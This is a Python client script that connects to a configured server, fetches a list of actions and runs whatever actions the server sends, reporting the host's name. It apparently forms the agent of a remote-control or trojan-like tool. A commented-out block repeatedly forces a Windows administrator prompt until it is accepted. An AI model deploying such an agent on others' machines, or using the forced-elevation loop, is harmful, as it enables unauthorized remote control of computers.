from common.commands import commandFunctions, init_command_functions
from common.util import *

import socket
import json
import sys
import os

with open("config.json", "r") as f: config = json.load(f)
IP = config["ip"]
PORT = config["port"]

def receive():
    print(f"Connected to {IP}:{PORT}")
    while True:
        try: data = s.recv(1024)
        except (ConnectionResetError, ConnectionAbortedError):
            print("Server Closed")
            os._exit(0)

        if not data:
            print("Server Closed")
            os._exit(0)

        data = data.decode("utf-8")
        for action in data.split("\r"):
            if not action: continue
            print(action)

            data = json.loads(action)
            if data["request_type"] == "action":
                try: commandFunctions[data["type"]]()
                except KeyError: print(f"Unknown Action: {data['type']}")
                continue
            elif data["request_type"] == "callback":
                if data["type"] == "actions":
                    init_command_functions(data["actions"])
                    send(s, {"request_type": "login", "role": 0, "pc_name": socket.gethostname()})

if __name__ == "__main__":
    """if not is_admin():
        while True:
            if ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, sys.argv[0], None, 8) != 42: continue
            break
        os._exit(0)"""

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    send(s, {"request_type": "get_actions"})

    receive()